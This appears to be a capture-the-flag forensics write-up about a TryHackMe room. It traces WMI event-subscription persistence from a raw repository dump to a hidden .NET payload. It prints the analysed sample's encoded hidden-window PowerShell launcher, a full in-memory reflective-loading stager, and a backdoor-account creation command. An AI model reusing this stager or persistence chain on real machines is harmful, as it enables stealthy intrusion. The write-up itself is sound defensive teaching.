---
title: "TryHackMe - Byte Lotus: After Hours"
date: 2026-08-07
tags: ["TryHackMe", "Digital Forensics", "WMI Persistence", "Malware Analysis", ".NET"]
excerpt: "Nothing in Startup, Scheduled Tasks, or Run keys — because the resort's back-office backdoor was never living there. A raw WMI repository dump, a disguised event consumer, and a fake hardware class hiding a .NET payload."
---

# TryHackMe: Byte Lotus — After Hours

**Room theme:** "Long after the front desk closes and the pool lights dim, the resort's back-office machines keep humming. Someone, or something, has been logging in during the small hours... Nothing obvious shows up in Startup, Scheduled Tasks, or the registry Run keys. Whatever's keeping itself alive is hiding somewhere quieter."

**Provided artifacts:** the raw files of a Windows CIM (WMI) repository — `INDEX.BTR`, `MAPPING1.MAP`, `MAPPING2.MAP`, `MAPPING3.MAP`, `OBJECTS.DATA`. No live host this time, purely offline forensics.

**Itinerary:**
- Parse the system artifacts for hidden custom configuration data.
- Locate the malicious class and extract its embedded payload.
- Decode the payload and submit the flag.

## Recognizing the artifacts

Those five filenames are unmistakable: they're the entire contents of `C:\Windows\System32\wbem\Repository\`, the on-disk database backing WMI. The room's hint about persistence hiding "somewhere quieter" than Startup/Scheduled Tasks/Run keys is a direct pointer at **WMI event subscriptions** — a well-known persistence mechanism that survives entirely inside this repository and is invisible to tools that only check the usual autorun locations.

## Parsing the repository

Rather than reversing the binary format by hand, [`dissect.cim`](https://github.com/fox-it/dissect.cim) parses `INDEX.BTR`/`OBJECTS.DATA`/`MAPPING*.MAP` directly and exposes the repository as a normal namespace/class/instance tree:

```
pip install dissect.cim
```

```python
from dissect.cim import CIM

cim = CIM.from_directory("/path/to/repo")  # expects all 5 files in one folder
```

## Finding the persistence

WMI-based persistence lives in `ROOT\subscription`, built from three cooperating classes: `__EventFilter` (the trigger condition), an event consumer (the action), and `__FilterToConsumerBinding` (the glue). Enumerating instances of each:

```python
ns = cim.root.namespace("subscription")

for cls_name in ["__EventFilter", "CommandLineEventConsumer", "__FilterToConsumerBinding"]:
    cls = ns.class_(cls_name)
    for inst in cls.instances:
        print(cls_name, inst.key)
        for name, prop in inst.properties.items():
            try:
                print(" ", name, "=", prop.value)
            except ValueError:
                pass  # uninitialized property
```

Two `__EventFilter` instances turned up. One (`SCM Event Log Filter`) is legitimate, standard Windows plumbing. The other — `EngineTelemetryFilter` — has a name deliberately chosen to sound like harmless telemetry, and is bound to a matching `CommandLineEventConsumer` named `EngineTelemetryConsumer`. Its `CommandLineTemplate` property holds the payload:

```
cmd /C powershell.exe -Sta -Nop -Window Hidden -enc JABmAGkAbABlAC...
```

## Decoding the launcher

PowerShell's `-enc` flag takes base64-encoded **UTF-16LE** text:

```python
import base64
print(base64.b64decode(b64_blob).decode("utf-16le"))
```

```powershell
$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
$o = New-Object IO.MemoryStream;
$d = New-Object IO.Compression.DeflateStream(
        [IO.MemoryStream][Convert]::FromBase64String($file),
        [IO.Compression.CompressionMode]::Decompress);
$b = New-Object Byte[](1024);
$r = $d.Read($b,0,1024);
while($r -gt 0){ $o.Write($b,0,$r); $r = $d.Read($b,0,1024) }
[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@()))|Out-Null
```

This is the payload's whole reason for existing: rather than embedding a script or binary directly in the consumer (which any competent EDR flags immediately), it reaches out to a **custom-defined WMI class**, `Win32_HardwareTelemetry` — deliberately named to blend in with real `Win32_*` hardware classes — reads a property called `ConfigData`, base64-decodes it, inflates it as raw DEFLATE, and reflectively loads the result as a .NET assembly in memory. No payload ever touches disk.

## Extracting the hidden configuration data

`Win32_HardwareTelemetry` isn't a real class, so it doesn't exist as a namespace lookup anywhere but `ROOT\cimv2`. Locating it and reading `ConfigData` is where the "hidden custom configuration" from the room's itinerary actually lives:

```python
ns = cim.root.namespace("cimv2")
cls = ns.class_("Win32_HardwareTelemetry")
```

The value wasn't stored on an *instance* — the PowerShell reads it straight off the **class definition itself** (`[WmiClass]` in PowerShell gets the class object, not an instance), meaning it's a property *default value* baked into the schema. `dissect.cim` parses default values as raw offsets into the class definition's internal string heap for `STRING`-typed properties, so the property needs one extra dereference:

```python
cd = cls.class_definition
offset = 76  # the raw default-value offset for ConfigData
config_data_b64 = cd.property_data.get_string(offset)
```

That yielded a 2.2KB base64 string — the actual "embedded payload" the room itinerary was pointing at.

## Decoding the payload

Following the same recipe the PowerShell used — base64 decode, then raw DEFLATE inflate (`.NET`'s `DeflateStream` has no zlib/gzip header, so Python needs `wbits=-15`):

```python
import base64, zlib

raw = base64.b64decode(config_data_b64)
data = zlib.decompressobj(-15).decompress(raw)
```

```
MZ\x90\x00...
```

An `MZ` header — a full PE executable, sitting compressed inside a fake hardware telemetry property the entire time.

```
file payload.bin
```

```
PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
```

## Recovering the flag

Plain ASCII `strings` on the assembly showed only scaffolding (`Program`, `AfterHours`, `updates.exe`, `Environment.MachineName`, `Process.Start`) — .NET string literals are stored UTF-16LE in the metadata heap, so ASCII-only string scanning misses them entirely:

```
strings -e l -n 6 payload.bin
```

```
bytelotusdc
cmd.exe
/c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add
Execution halted: Environment mismatch.
```

The payload's actual behavior: check the machine name against an expected value (`bytelotusdc`), and if it matches, quietly create a local backdoor account named `patch` — with a base64-encoded password sitting right there in the binary:

```python
import base64
print(base64.b64decode("VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9").decode())
```

```
THM{xxx}
```

## Full chain summary

1. Recognized `INDEX.BTR` / `OBJECTS.DATA` / `MAPPING*.MAP` as a raw Windows WMI (CIM) repository dump.
2. Parsed it with `dissect.cim` and enumerated `ROOT\subscription` for `__EventFilter` / event consumer pairs — the classic WMI persistence mechanism that hides outside Startup, Scheduled Tasks, and Run keys.
3. Found a disguised filter/consumer pair (`EngineTelemetryFilter` → `EngineTelemetryConsumer`) whose `CommandLineTemplate` ran a base64+UTF-16 encoded PowerShell stager.
4. Decoded the stager: it pulled a `ConfigData` property off a fake, custom-defined WMI class (`Win32_HardwareTelemetry`) rather than embedding its payload directly.
5. Dereferenced that property's value through the class definition's string heap to recover a base64 blob.
6. Base64-decoded and raw-DEFLATE-inflated the blob into a .NET PE assembly, loaded reflectively in memory by the original stager (never touching disk).
7. Extracted UTF-16LE strings from the assembly to find a backdoor-account creation command with a base64-encoded password — the flag.

## Takeaways

- WMI event subscriptions (`__EventFilter` + an event consumer + `__FilterToConsumerBinding`) are a genuinely stealthy persistence mechanism precisely because they live in a database most IR tooling doesn't inspect by default — always check `ROOT\subscription` alongside the usual autorun locations.
- Attackers naming things to sound like legitimate telemetry or diagnostics (`EngineTelemetryFilter`, `Win32_HardwareTelemetry`) is a durable trick — it defeats a quick visual skim far better than it defeats actually reading the content.
- Defining an entirely custom WMI class purely to smuggle a property value is a clever way to keep a payload out of the consumer definition itself, where naive detections are more likely to look.
- `strings` on a binary defaults to ASCII; .NET assemblies store their string literals as UTF-16LE, so `strings -e l` (or an equivalent wide-character scan) is essential — the flag here was invisible to a plain ASCII pass.
- Layered encoding (base64 → raw DEFLATE → PE → base64 again inside the PE) doesn't need to be cryptographically strong to be effective; each layer just needs to break the pattern-matching of whatever's inspecting the previous one.